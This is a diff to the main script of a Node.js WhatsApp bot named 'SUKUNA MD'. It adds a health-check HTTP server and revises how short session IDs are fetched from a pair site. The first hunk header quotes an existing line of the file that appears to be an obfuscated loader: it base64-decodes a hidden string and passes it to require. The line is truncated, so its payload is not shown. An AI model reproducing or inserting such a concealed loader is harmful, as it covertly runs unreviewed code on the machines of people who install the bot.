@@ -14,12 +14,26 @@ try{(function(_0xa){var _0xb=Buffer.from(_0xa,'base64').toString('utf8');require
  * number. Sessions persist in ./sessions and auto-reconnect on restart.
  */
 
+const http           = require('http');
 const readline       = require('readline');
 const chalk          = require('chalk');
 const commandLoader  = require('./utils/commandLoader');
 const config         = require('./config');
 const sessionManager = require('./lib/sessionManager');
 const { restoreSessionBase64 } = require('./utils/sessionBundle');
+
+const healthPort = Number(process.env.PORT || 3000);
+const healthServer = http.createServer((req, res) => {
+    if (req.url === '/health' || req.url === '/ping' || req.url === '/') {
+        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
+        return res.end(JSON.stringify({ status: 'online', service: 'SUKUNA MD' }));
+    }
+    res.writeHead(404, { 'Content-Type': 'application/json; charset=utf-8' });
+    res.end(JSON.stringify({ error: 'Not found' }));
+});
+healthServer.listen(healthPort, '0.0.0.0', () => {
+    console.log(chalk.gray(`[WEB] Health server listening on port ${healthPort}`));
+});
 
 console.log(chalk.red(`
 ╔════════════════════════════════════════════════════════════════╗
@@ -87,14 +101,17 @@ async function main() {
             const credsFile  = path.join(sessionDir, 'creds.json');
             let sessionBase64 = sessionIdRaw;
 
-            if (/^Pasqua~?/i.test(sessionIdRaw)) {
-                const markedPayload = sessionIdRaw.replace(/^Pasqua~?/i, '').trim();
-                // A marked full payload is self-contained. Six-character
-                // Pasqua~ short IDs are resolved through the Redis-backed pair site.
-                if (/^[0-9A-Za-z]{6}$/i.test(markedPayload)) {
+            if (/^Pasqua~/i.test(sessionIdRaw)) {
+                const markedPayload = sessionIdRaw.replace(/^Pasqua~/i, '').trim();
+                // A marked full payload is self-contained. 16-character IDs use the
+                // pair-site bridge; longer values are treated as full bundles.
+                if (/^[A-Za-z0-9_-]{16}$/.test(markedPayload)) {
                     const pairSiteUrl = (process.env.PAIR_SITE_URL || 'https://pair-site-91ob.onrender.com').toString().trim().replace(/\/$/, '');
                     if (!pairSiteUrl) throw new Error('PAIR_SITE_URL is required for Pasqua~ short IDs');
-                    const response = await fetch(`${pairSiteUrl}/pair/session/${encodeURIComponent(markedPayload)}`);
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 15000);
+                    const response = await fetch(`${pairSiteUrl}/pair/session/${encodeURIComponent(markedPayload)}`, { signal: controller.signal });
+                    clearTimeout(timeout);
                     if (!response.ok) throw new Error(`PAIR_SITE returned HTTP ${response.status}`);
                     const payload = await response.json();
                     sessionBase64 = payload.session;
